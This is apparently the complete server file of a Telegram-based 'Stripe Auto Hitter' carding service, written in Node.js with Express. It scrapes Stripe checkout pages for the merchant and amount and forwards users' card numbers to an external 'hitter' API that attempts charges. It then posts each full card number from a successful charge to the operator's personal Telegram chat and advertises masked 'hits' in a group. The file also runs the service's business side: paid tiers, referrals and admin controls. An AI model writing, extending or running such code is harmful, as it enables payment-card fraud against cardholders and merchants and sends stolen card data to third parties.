const express = require('express');
const path = require('path');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

const axios = require('axios');
const config = require('./config');
const storage = require('./storage');
const membership = require('./membership'); // New robust check
const bot = require('./bot');

// Serve static files from the current directory
const fs = require('fs');

// Serve static files from the current directory
app.use(express.static(__dirname));
app.use(express.json({ limit: '50mb' })); // Increase limit for mass cards

// --- DATABASE LOGIC ---
// To persist on Render, mount a disk at /data and move database.json there
const DATA_DIR = fs.existsSync('/data') ? '/data' : __dirname;
const DB_FILE = path.join(DATA_DIR, 'database.json');

function readDB() {
  return storage.getDB();
}

async function writeDB(data) {
  return await storage.save(data);
}

// Daily Limit Reset Logic
function checkDailyReset(user) {
  const today = new Date().toDateString();
  if (user.last_hit_date !== today) {
    user.hits_today = 0;
    user.last_hit_date = today;
    return true;
  }
  return false;
}

// --- DATABASE & OTP LOGIC ---
const otpStore = new Map(); // chatId -> { otp, expires }

async function checkPlanExpiry(chatId, user) {
  if (user.plan !== 'free' && user.expiry) {
    if (new Date() > new Date(user.expiry)) {
      console.log(`[Expiry] Plan expired for user ${chatId}. Resetting to FREE.`);
      user.plan = 'free';
      user.expiry = null;
      await storage.saveUser(chatId, { plan: 'free', expiry: null });
      return true;
    }
  }
  return false;
}

// Advanced Stripe Scraper (Maximum Reliability)
async function scrapeStripeInfo(url) {
    try {
        console.log(`[Scraper] Analyzing: ${url}`);
        const response = await axios.get(url, {
            headers: { 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9'
            },
            timeout: 15000
        });
        const html = response.data;

        let site = 'Stripe Page';
        let amount = 'Unknown';
        let currency = '';

        // --- STRATEGY 1: PARSE window.__INITIAL_STATE__ (Most Precise) ---
        const stateMatch = html.match(/window\.__INITIAL_STATE__\s*=\s*({.+?});/s) || 
                          html.match(/window\.StripeCheckout\s*=\s*({.+?});/s);
        
        if (stateMatch) {
            try {
                const state = JSON.parse(stateMatch[1]);
                console.log(`[Scraper] Found Initial State JSON`);
                
                // Common paths for merchant name
                const merchant = state.checkout?.business_name || 
                               state.merchant_name || 
                               state.invoice?.business_name || 
                               state.account_name;
                
                if (merchant) site = merchant;

                // Common paths for amount
                const amt = state.checkout?.total_amount_display || 
                            state.amount_total_display || 
                            state.invoice?.total_display ||
                            state.amount_formatted;
                
                if (amt) amount = amt;
            } catch (e) {
                console.warn(`[Scraper] Failed to parse state JSON: ${e.message}`);
            }
        }

        // --- STRATEGY 2: META TAGS & TITLE (Reliable Fallback) ---
        if (site === 'Stripe Page' || amount === 'Unknown') {
            const ogTitle = html.match(/<meta[^>]*property="og:title"[^>]*content="([^"]+)"/i) ||
                            html.match(/<meta[^>]*name="twitter:title"[^>]*content="([^"]+)"/i) ||
                            html.match(/<title>([^<]+)<\/title>/i);
            const ogDesc = html.match(/<meta[^>]*property="og:description"[^>]*content="([^"]+)"/i) ||
                           html.match(/<meta[^>]*name="description"[^>]*content="([^"]+)"/i);
            const siteName = html.match(/<meta[^>]*property="og:site_name"[^>]*content="([^"]+)"/i);

            if (ogTitle && site === 'Stripe Page') {
                site = ogTitle[1].replace(/Pay /i, '').replace(/ \| Stripe/gi, '').replace('Stripe:', '').trim();
            } else if (siteName && site === 'Stripe Page') {
                site = siteName[1].trim();
            }

            if (ogDesc && amount === 'Unknown') {
                const amtMatch = ogDesc[1].match(/([$€£¥৳]\s?\d+([.,]\d{2})?)/) || 
                                 ogDesc[1].match(/(\d+([.,]\d{2})?\s?(?:USD|EUR|GBP|BDT|CAD|AUD))/i);
                if (amtMatch) amount = amtMatch[1].trim();
            }
        }

        // --- STRATEGY 3: JSON-LD ---
        if (amount === 'Unknown') {
            const jsonLdMatch = html.match(/<script type="application\/ld\+json">([\s\S]+?)<\/script>/i);
            if (jsonLdMatch) {
                try {
                    const data = JSON.parse(jsonLdMatch[1]);
                    if (data.name && site === 'Stripe Page') site = data.name;
                    if (data.offers && data.offers.price) {
                        amount = `${data.offers.priceCurrency || ''} ${data.offers.price}`.trim();
                    }
                } catch (e) {}
            }
        }

        // --- STRATEGY 4: RAW BODY PATTERN (Final Resort) ---
        if (amount === 'Unknown') {
            const rawAmtMatch = html.match(/([$€£¥৳]\s?\d{1,5}(?:[.,]\d{2})?)/);
            if (rawAmtMatch) {
                amount = rawAmtMatch[1].trim();
            }
        }

        // Final cleanup
        site = site.replace(/\| Stripe/gi, '').replace(/Stripe/gi, '').trim() || 'Stripe Page';
        if (site.length > 25) site = site.substring(0, 22) + '...';
        
        // Clean up amount (e.g. remove multiple currencies if detected)
        if (amount !== 'Unknown') {
            amount = amount.replace(/Pay /gi, '').trim();
        }

        console.log(`[Scraper] Result: ${site} - ${amount}`);
        return { site, amount };
    } catch (err) {
        console.error('[Scraper Error]:', err.message);
        return { site: 'Stripe Page', amount: 'Unknown' };
    }
}

// Link Analysis Endpoint (Primary: User's API | Fallback: Native Scraper)
app.post('/analyze-link', async (req, res) => {
    let { url } = req.body;
    if (!url) return res.status(400).json({ error: 'URL required' });

    url = url.trim();
    
    const isStripePage = url.includes('stripe.com') || 
                        url.includes('/c/pay/') || 
                        url.includes('/billing/') || 
                        url.includes('/invoice/') || 
                        url.includes('/p/session/') ||
                        url.includes('/buy/');

    if (!isStripePage) {
        return res.status(400).json({ error: 'Invalid Payment URL' });
    }

    try {
        console.log(`[Link Analysis] Native Analysis for: ${url}`);
        const result = await scrapeStripeInfo(url);
        
        // Clean up the site name for the UI
        result.site = result.site.replace(/\\n/g, ' ').replace(/\n/g, ' ').replace(/\\/g, '').trim();
        
        res.json(result);
    } catch (err) {
        console.error('[Link Analysis Error]:', err.message);
        res.status(500).json({ 
            error: 'Analysis Error', 
            site: 'Stripe Page',
            amount: 'Unknown' 
        });
    }
});


// --- USER & HIT MANAGEMENT ---

// Get User Plan Info & Handle Referrals
app.post('/get-user-info', async (req, res) => {
  const { chatId, referrerId } = req.body;
  if (!chatId) return res.status(400).json({ error: 'Chat ID required' });

  const db = readDB();
  let user = db.users[chatId];
  let isNewUser = false;

  if (!user) {
    isNewUser = true;
    user = {
      plan: 'free',
      hits_today: 0,
      last_hit_date: new Date().toDateString(),
      expiry: null,
      referralCount: 0,
      referredBy: null,
      isVerified: false,
      total_hits: 0
    };
    db.users[chatId] = user;
    console.log(`[Referral] New user registered: ${chatId}`);
  }

  // Handle Referral Logic for New Users (Wait for verification to credit)
  if (isNewUser && referrerId && referrerId !== chatId) {
    const referrer = db.users[referrerId];
    if (referrer) {
      user.referredBy = referrerId;
      console.log(`[Referral] User ${chatId} referred by ${referrerId}. Awaiting verification.`);
    }
  }

  checkDailyReset(user);
  await checkPlanExpiry(chatId, user);
  await storage.saveUser(chatId, user); // Sync back any changes

  const allUsers = Object.entries(db.users)
    .map(([id, u]) => ({ id, total_hits: u.total_hits || 0 }))
    .sort((a, b) => b.total_hits - a.total_hits);

  const totalUsers = allUsers.length;
  const totalHitsGlobal = allUsers.reduce((sum, u) => sum + u.total_hits, 0);
  const userTotalHits = user.total_hits || 0;
  const userRank = allUsers.findIndex(u => u.id === chatId) + 1;

  // Current mandatory channels/groups list
  const settings = db.settings || {};
  const CHANNELS = settings.channels || config.CHANNELS;
  const formattedChannels = CHANNELS.map(ch => {
      let url = ch;
      let name = ch;
      if (typeof ch === 'string') {
          if (ch.startsWith('@')) {
              url = `https://t.me/${ch.substring(1)}`;
              name = ch.substring(1).split('_').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' ');
          } else if (ch.startsWith('-')) {
              url = `tg://resolve?domain=${ch}`; // Fallback for IDs
              name = `Private Group (${ch})`;
          }
      }
      return { id: ch, name, url };
  });

  res.json({
    chatId,
    plan: user.plan,
    hitsToday: user.hits_today,
    maxHits: user.plan === 'free' ? 2 : 'Unlimited',
    expiry: user.expiry,
    referralCount: user.referralCount || 0,
    isVerified: user.isVerified || false,
    totalUsers,
    totalHitsGlobal,
    userTotalHits,
    userRank,
    channels: formattedChannels
  });
});

// Send OTP via Bot
app.post('/send-otp', async (req, res) => {
    const { chatId } = req.body;
    if (!chatId) return res.status(400).json({ error: 'Chat ID required' });

    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    otpStore.set(chatId, { otp, expires: Date.now() + 5 * 60 * 1000 }); // 5 min expiry

    const message = `🔐 <b>Verification Code</b>\n\nYour OTP for <b>Auto Hitter App</b> is: <code>${otp}</code>\n\nDon't share this code with anyone.`;
    
    try {
        const botToken = config.LOGIN_OTP_BOT_TOKEN;
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`[OTP] Sent to ${chatId}`);
        res.json({ success: true });
    } catch (err) {
        console.error('[OTP] Failed to send:', err.message);
        res.status(500).json({ error: 'Failed to send OTP' });
    }
});

// Verify OTP
app.post('/verify-otp', (req, res) => {
    const { chatId, code, referrerId } = req.body;
    const stored = otpStore.get(chatId);

    if (!stored || stored.otp !== code || Date.now() > stored.expires) {
        return res.status(400).json({ error: 'Invalid or expired code' });
    }

    otpStore.delete(chatId); // Clear after use
    res.json({ success: true });
});

// Endpoint to verify channel membership
app.post('/verify-membership', async (req, res) => {
    const { chatId } = req.body;
    if (!chatId) return res.status(400).json({ error: 'Chat ID required' });

    const db = readDB();
    const user = db.users[chatId];
    if (!user) return res.status(404).json({ error: 'User not found' });

    // Channels from DB or Config
    const settings = db.settings || {};
    const bot = require('./bot');
    
    try {
        const allJoined = await membership.checkMembership(bot, chatId, true);
        
        if (allJoined) {
            const wasVerified = user.isVerified;
            user.isVerified = true;
            
            // Crediting the Referrer ONLY ONCE
            if (!wasVerified && user.referredBy) {
                const referrer = db.users[user.referredBy];
                if (referrer) {
                    referrer.referralCount = (referrer.referralCount || 0) + 1;
                    console.log(`[Referral] Verification Success: Credited ${user.referredBy}. New Count: ${referrer.referralCount}`);
                    
                    // Reward Check: 10 Referrals = Silver Plan for 7 days
                    if (referrer.referralCount >= 10) {
                        const expiry = new Date();
                        expiry.setDate(expiry.getDate() + 7);
                        referrer.plan = 'silver';
                        referrer.expiry = expiry.toISOString();
                        referrer.referralCount -= 10;
                        notifyPlanActivation(user.referredBy, 'silver', '7 day(s)');
                    }
                }
            }
            
            await storage.saveUser(chatId, { isVerified: user.isVerified });
            if (user.referredBy) {
                const referrer = db.users[user.referredBy];
                if (referrer) {
                    await storage.saveUser(user.referredBy, { 
                        referralCount: referrer.referralCount, 
                        plan: referrer.plan, 
                        expiry: referrer.expiry 
                    });
                }
            }
            res.json({ success: true, message: 'Verification successful!' });
        } else {
            const cached = membership.membershipCache?.get(chatId.toString());
            let errorMsg = 'You have not joined all channels yet.';
            if (cached && cached.failingChannel) {
                const debugStatus = cached.status_detail ? ` (Status: ${cached.status_detail})` : '';
                errorMsg = `Please join the channel: ${cached.failingChannel}${debugStatus}`;
            }
            res.status(400).json({ error: errorMsg });
        }
    } catch (err) {
        console.error('[Verify] Membership check system error:', err.message);
        res.status(500).json({ error: `Verification system error: ${err.message}` });
    }
});

// Hit Proxy with Limit Checks
// Telegram Notification Helper (Server-side)
// Helper to escape HTML special characters for Telegram
function escapeHTML(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

async function sendHitNotification(res, gate, userPlan, userName, site, amount, card) {
    const LOG_BOT_TOKEN = config.NOTIFY_BOT_TOKEN; // Roket Hitt for personal log
    const MAIN_BOT_TOKEN = config.MAIN_BOT_TOKEN; // @autohittrobot for group public message
    const PERSONAL_ID = config.PERSONAL_CHAT_ID;
    const GROUP_ID = config.GROUP_CHAT_ID;

    const gatewayName = gate === 'checkout' ? 'Stripe Checkout Hitter' : (gate === 'invoice' ? 'Stripe Invoice Hitter' : 'Stripe Hitter');

    // Message for Personal Log (Shows everything)
    const personalMsg = `
🔥 <b>HIT DETECTED</b> ⚡
👤 <b>User</b>: <code>${userName}</code> 🇧🇩 🇵🇸 🇮🇷 🇵🇰
🆙 <b>Plan</b>: ${userPlan.toUpperCase()}
💳 <b>Card</b>: <code>${card}</code>
↔️ <b>Gateway</b>: ${gatewayName}
✅ <b>Response</b>: Charged Successfully
🌐 <b>Site</b>: ${site}
💰 <b>Amount</b>: ${amount}
`.trim();

    // Message for Group (Masked Card, Ads)
    const groupMsg = `
🚀 <b>HIT SUCCESSFUL</b> ⚡
👤 <b>User</b>: <code>${userName}</code> 🇧🇩
🆙 <b>Plan</b>: ${userPlan.toUpperCase()}
↔️ <b>Gateway</b>: ${gatewayName}
✅ <b>Response</b>: Charged Successfully
🌐 <b>Site</b>: ${site}
💰 <b>Amount</b>: ${amount}

<i>Checked by @autohittrobot ✅</i>
`.trim();

    // 1. Send Full Log to Personal ID (Bot: Roket Hitt)
    if (PERSONAL_ID) {
        try {
            await axios.post(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
                chat_id: PERSONAL_ID,
                text: personalMsg,
                parse_mode: 'HTML'
            });
        } catch (err) {
            console.error('[Notification] Personal Log Error:', err.message);
        }
    }

    // 2. Send Clean Log to Group (Bot: @autohittrobot)
    if (GROUP_ID) {
        try {
            await axios.post(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
                chat_id: GROUP_ID,
                text: groupMsg,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🚀 Open Bot', url: 'https://t.me/autohittrobot' }
                    ]]
                }
            });
        } catch (err) {
            console.error('[Notification] Group Log Error:', err.message);
        }
    }
}

// Function to send plan activation notification (Group and Personal)
async function notifyPlanActivation(chatId, plan, duration) {
    const NOTIFY_BOT_TOKEN = config.NOTIFY_BOT_TOKEN;
    const NOTIFY_CHAT_ID = config.GROUP_CHAT_ID; // Send to Group

    const message = `
⭐ <b>Plan Activated</b>
━━━━━━━━━━━━━━━━━━━━

👤 <b>User</b>: <code>${chatId}</code>
📦 <b>Plan</b>: ${plan.toUpperCase()}
📅 <b>Duration</b>: ${duration || '7 day(s)'}

<i>User ${duration ? 'was upgraded' : 'bought'} ${plan.toUpperCase()} plan ✅</i>

━━━━━━━━━━━━━━━━━━━━
`.trim();

    try {
        // Send to Group
        await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
            chat_id: NOTIFY_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        }).catch(() => {});

        // Send to User
        const bot = require('./bot');
        await bot.telegram.sendMessage(chatId, message, { parse_mode: 'HTML' }).catch(() => {});
    } catch (err) {
        console.error('[Notification] Activation failed:', err.message);
    }
}

// Hit Proxy with Limit Checks
app.post('/hit-proxy/:gate', async (req, res) => {
    const { gate } = req.params;
    const { chatId, card, url, userName, site, amount } = req.body;

    if (!chatId || !card || !url) {
        return res.status(400).json({ error: 'Missing parameters (chatId, card, or url)' });
    }

    const db = readDB();
    const user = db.users[chatId];

    if (!user) {
        return res.status(403).json({ error: 'User not registered. Please login.' });
    }

    checkDailyReset(user);
    if (user.plan !== 'free') await checkPlanExpiry(chatId, user);

    // Enforce Limit for Free Plan
    if (user.plan === 'free' && user.hits_today >= 2) {
        return res.status(403).json({
            error: 'Limit Reached',
            message: 'You have reached your daily limit of 2 hits. Upgrade to Silver/Gold for unlimited access!'
        });
    }

    try {
        const settings = db.settings || {};
        const API_KEY = settings.api_key || config.API_KEY;
        const API_URL = settings.api_url || config.API_URL;

        // 1. Prepare clean payload for the hitter backend
        const hitterPayload = {
            url: url.trim(),
            card: card.trim()
        };

        console.log(`[Hit Proxy] Task for ${chatId}. Gateway: ${gate}. Card: ${card.substring(0, 6)}...`);

        // 2. Perform raw request to Hitter API
        const response = await axios.post(`${API_URL}/hit/${gate}`, hitterPayload, {
            headers: { 
                'X-API-Key': API_KEY, 
                'Content-Type': 'application/json' 
            },
            timeout: 100000, // Sufficient for 3DS/Network latency
            validateStatus: () => true 
        });

        let result = response.data;
        
        // Handle cases where result is a string, null, or not an object
        if (!result || typeof result !== 'object') {
            const errorMsg = typeof result === 'string' ? result : 'Empty or non-JSON response';
            result = { 
                status: 'error', 
                message: `Server Error (${response.status}): ${errorMsg}`,
                raw: result 
            };
        }
        
        // Ensure status and message exist for the frontend logic
        if (!result.status) result.status = response.status >= 400 ? 'error' : 'unknown';
        if (!result.message && !result.error) {
            result.message = `Response Code: ${response.status}`;
        }

        const status = (result.status || '').toLowerCase();
        const lowerMsg = (result.message || result.error || '').toLowerCase();

        // ONLY deduct from limit if strictly 'charged' or 'approved' or if session is already succeeded
        if (status === 'charged' || status === 'approved' || lowerMsg.includes('checkout_succeeded_session')) {
            // ONLY increment hits for FREE users. Premium users stay at 0.
                if (user.plan === 'free') {
                    user.hits_today++;
                }
                // Global Total Hits
                user.total_hits = (user.total_hits || 0) + 1;
                
                await storage.saveUser(chatId, user);
                console.log(`[Limit] SUCCESS for ${chatId} (${user.plan}). Total hits: ${user.total_hits}`);
                await sendHitNotification(result, gate, user.plan, userName, site, amount, card);
        } else {
            console.log(`[Limit] FAILED/DECLINED for ${chatId} (${status}). Limit NOT deducted.`);
        }

        // ALWAYS return current remaining hits even if the hit failed
        res.json({
            ...result,
            remainingHits: user.plan === 'free' ? (2 - user.hits_today) : 'Unlimited'
        });

    } catch (err) {
        console.error('Proxy System Error:', err.message);
        // Even on internal proxy error, try to return current hits
        res.status(500).json({ 
            error: 'System Error', 
            message: err.message,
            remainingHits: user.plan === 'free' ? (2 - user.hits_today) : 'Unlimited'
        });
    }
});

// Redeem Code Endpoint
app.post('/redeem-code', async (req, res) => {
  const { chatId, code } = req.body;
  if (!chatId || !code) return res.status(400).json({ error: 'Chat ID and Code required' });

  const db = readDB();
  const userData = db.users[chatId];
  const codeData = db.redeem_codes[code];

  if (!codeData || codeData.status !== 'active') {
    return res.status(400).json({ error: 'Invalid or Used Code' });
  }

  if (!userData) {
    return res.status(404).json({ error: 'User not found. Please login first.' });
  }

  // Handle Promo Code Logic
  let durationMsg = '7 day(s)';
  const expiryDate = new Date();

  if (codeData.type === 'promo') {
    // Check if user already used this promo code
    if (codeData.redeemedBy && codeData.redeemedBy.includes(chatId)) {
      return res.status(400).json({ error: 'You have already redeemed this promo code!' });
    }

    // Check usage limit
    if (codeData.usedCount >= codeData.maxUses) {
      codeData.status = 'exhausted';
      await storage.saveRedeemCode(code, { status: 'exhausted' });
      return res.status(400).json({ error: 'Promo code usage limit reached!' });
    }

    // Set duration in hours
    const hours = parseInt(codeData.durationHours) || 1;
    expiryDate.setHours(expiryDate.getHours() + hours);
    durationMsg = `${hours} hour(s)`;

    // Update usage
    codeData.usedCount = (codeData.usedCount || 0) + 1;
    if (!codeData.redeemedBy) codeData.redeemedBy = [];
    codeData.redeemedBy.push(chatId);

    if (codeData.usedCount >= codeData.maxUses) {
      codeData.status = 'exhausted';
    }
  } else {
    // Standard 7-day Code
    expiryDate.setDate(expiryDate.getDate() + 7);
    codeData.status = 'used';
    codeData.usedBy = chatId;
  }

  // Update user state before saving
  userData.plan = codeData.plan;
  userData.expiry = expiryDate.toISOString();

  // Update user and redeem code status
  await storage.saveUser(chatId, { plan: userData.plan, expiry: userData.expiry });
  
  if (codeData.type === 'promo') {
      await storage.saveRedeemCode(code, { 
          usedCount: codeData.usedCount, 
          status: codeData.status, 
          redeemedBy: codeData.redeemedBy 
      });
  } else {
      await storage.saveRedeemCode(code, { 
          status: codeData.status, 
          usedBy: codeData.usedBy 
      });
  }

  // Notify after successful redemption
  notifyPlanActivation(chatId, userData.plan, durationMsg);

  res.json({ 
    success: true, 
    plan: userData.plan, 
    expiry: userData.expiry,
    message: `Congratulations! Your ${userData.plan.toUpperCase()} plan is now active for ${durationMsg}!`
  });
});

// --- ADMIN ENDPOINTS ---
const ADMIN_PWD = config.ADMIN_PWD;

app.post('/admin/generate-code', async (req, res) => {
  const { password, plan } = req.body;
  if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });

  const code = 'HIT-' + Math.random().toString(36).substring(2, 10).toUpperCase();
  const db = readDB();
  db.redeem_codes[code] = { 
    type: 'standard',
    plan, 
    status: 'active', 
    createdAt: new Date().toISOString() 
  };
  await storage.saveRedeemCode(code, db.redeem_codes[code]);

  res.json({ code, plan });
});

// Generate Promo Code Endpoint
app.post('/admin/generate-promo', async (req, res) => {
  try {
    const { password, plan, maxUses, durationHours } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });

    const code = 'PROMO-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    const db = readDB();
    
    if (!db.redeem_codes) db.redeem_codes = {};

    db.redeem_codes[code] = { 
      type: 'promo',
      plan: plan || 'silver', 
      maxUses: parseInt(maxUses) || 1,
      durationHours: parseInt(durationHours) || 1,
      usedCount: 0,
      redeemedBy: [],
      status: 'active', 
      createdAt: new Date().toISOString() 
    };
    
    await storage.saveRedeemCode(code, db.redeem_codes[code]);
    res.json({ code, plan, maxUses, durationHours });
  } catch (err) {
    console.error('[Admin] Generate Promo Error:', err.message);
    res.status(500).json({ error: 'Server Error', message: err.message });
  }
});

// Broadcast Message to All Users
app.post('/admin/broadcast', async (req, res) => {
  try {
    const { password, message } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    if (!message) return res.status(400).json({ error: 'Message required' });

    const db = readDB();
    const userIds = Object.keys(db.users || {});
    
    if (userIds.length === 0) {
      return res.json({ success: true, count: 0, failed: 0, message: 'No users to broadcast to.' });
    }

    console.log(`[Admin] Starting broadcast to ${userIds.length} users...`);
    const bot = require('./bot');
    
    let successCount = 0;
    let failedCount = 0;

    // We use a loop instead of Promise.all to avoid hitting Telegram's rate limits
    // and to handle individual errors more gracefully.
    for (const uid of userIds) {
      try {
        await bot.telegram.sendMessage(uid, message, { parse_mode: 'HTML' });
        successCount++;
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 50)); 
      } catch (err) {
        console.warn(`[Admin] Broadcast failed for user ${uid}:`, err.message);
        failedCount++;
      }
    }

    console.log(`[Admin] Broadcast completed: ${successCount} success, ${failedCount} failed.`);
    res.json({ 
      success: true, 
      count: successCount, 
      failed: failedCount, 
      message: `Broadcast completed. Sent: ${successCount}, Failed: ${failedCount}` 
    });
  } catch (err) {
    console.error('[Admin] Broadcast Error:', err.message);
    res.status(500).json({ error: 'Server Error', message: err.message });
  }
});

app.post('/admin/users', (req, res) => {
  try {
    const { password } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    const db = readDB();
    if (!db || !db.users) return res.json({});
    res.json(db.users);
  } catch (err) {
    console.error('[Admin] Get Users Error:', err.message);
    res.status(500).json({ error: 'Server Error', message: err.message });
  }
});

// System Settings Endpoints
app.post('/admin/get-settings', async (req, res) => {
  try {
    const { password } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    const db = readDB();
    const settings = db.settings || { 
        api_key: config.API_KEY, 
        api_url: config.API_URL,
        extract_api: config.EXTRACT_API,
        channels: config.CHANNELS
    };
    if (!settings.extract_api) settings.extract_api = config.EXTRACT_API;
    if (!settings.channels) settings.channels = config.CHANNELS;
    res.json(settings);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/admin/update-settings', async (req, res) => {
  try {
    const { password, api_key, api_url, extract_api, channels } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    
    const db = readDB();
    const oldSettings = db.settings || {};
    db.settings = { 
        ...oldSettings,
        api_key: (api_key || '').trim(), 
        api_url: (api_url || '').trim(),
        extract_api: (extract_api || '').trim(),
        channels: Array.isArray(channels) ? channels : (oldSettings.channels || config.CHANNELS)
    };
    
    await storage.saveSettings({ 
        api_key: db.settings.api_key, 
        api_url: db.settings.api_url, 
        extract_api: db.settings.extract_api, 
        channels: db.settings.channels 
    });
    res.json({ success: true, message: 'Settings updated successfully' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DIRECT Activation by Chat ID
app.post('/admin/update-user', async (req, res) => {
  try {
    const { password, targetChatId, plan, duration } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    if (!targetChatId || !plan) return res.status(400).json({ error: 'Chat ID and Plan required' });

    const db = readDB();
    let user = db.users[targetChatId];

    if (!user) {
      user = {
        plan: 'free',
        hits_today: 0,
        last_hit_date: new Date().toDateString(),
        expiry: null,
        referralCount: 0,
        referredBy: null
      };
      db.users[targetChatId] = user;
    }

    user.plan = plan;
    
    if (plan === 'free') {
      user.expiry = null;
    } else {
      if (duration === '7days') {
        const expiry = new Date();
        expiry.setDate(expiry.getDate() + 7);
        user.expiry = expiry.toISOString();
      } else if (duration === 'permanent') {
        user.expiry = null; // No expiry
      }
    }

    await storage.saveUser(targetChatId, { plan: user.plan, expiry: user.expiry });
    // Notify after successful activation
    notifyPlanActivation(targetChatId, plan, duration === '7days' ? '7 day(s)' : 'Permanent');

    res.json({ success: true, message: `User ${targetChatId} updated to ${plan.toUpperCase()} (${duration})` });
  } catch (err) {
    console.error('[Admin] Update User Error:', err.message);
    res.status(500).json({ error: 'Server Error', message: err.message });
  }
});

// Update Referrals Endpoint
app.post('/admin/update-referrals', async (req, res) => {
  try {
    const { password, targetChatId, newCount } = req.body;
    if (password !== ADMIN_PWD) return res.status(401).json({ error: 'Unauthorized' });
    if (!targetChatId) return res.status(400).json({ error: 'Chat ID required' });

    const db = readDB();
    let user = db.users[targetChatId];

    if (!user) {
      user = {
        plan: 'free',
        hits_today: 0,
        last_hit_date: new Date().toDateString(),
        expiry: null,
        referralCount: 0,
        referredBy: null
      };
      db.users[targetChatId] = user;
    }

    user.referralCount = parseInt(newCount) || 0;

    // Auto Reward if count >= 10
    if (user.referralCount >= 10 && user.plan === 'free') {
        const expiry = new Date();
        expiry.setDate(expiry.getDate() + 7);
        user.plan = 'silver';
        user.expiry = expiry.toISOString();
        user.referralCount -= 10;
        notifyPlanActivation(targetChatId, 'silver', '7 day(s)');
    }

    await storage.saveUser(targetChatId, { referralCount: user.referralCount, plan: user.plan, expiry: user.expiry });
    res.json({ success: true, message: `User ${targetChatId} referrals updated to ${user.referralCount}` });
  } catch (err) {
    console.error('[Admin] Update Referrals Error:', err.message);
    res.status(500).json({ error: 'Server Error', message: err.message });
  }
});

// Ping endpoint
app.get('/ping', (req, res) => {
  res.send('PONG');
});

// Send index.html for all routes to handle TWA correctly
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Self-ping to prevent Render sleeping
function startKeepAlive() {
  const url = process.env.RENDER_EXTERNAL_URL;
  if (url) {
    console.log(`Keep-alive started for: ${url}`);
    setInterval(() => {
      https.get(`${url}/ping`, (res) => {
        console.log(`Self-ping status: ${res.statusCode}`);
      }).on('error', (err) => {
        console.error(`Self-ping failed: ${err.message}`);
      });
    }, 14 * 60 * 1000); // 14 minutes (Render sleeps after 15)
  }
}

async function startServer() {
  // Sync DB on Startup
  await storage.init();
  
  app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Open http://localhost:${PORT} to view your app`);
    startKeepAlive();
    
    // Launch Bot
    bot.launch()
      .then(() => {
        console.log('✅ Telegram Bot is active!');
      })
      .catch(err => {
        console.error('❌ Telegram Bot Error:', err.message);
        console.log('⚠️ Server will continue running without the bot.');
      });
  
    // Enable graceful stop
    process.once('SIGINT', () => bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot.stop('SIGTERM'));
  });
}

startServer();
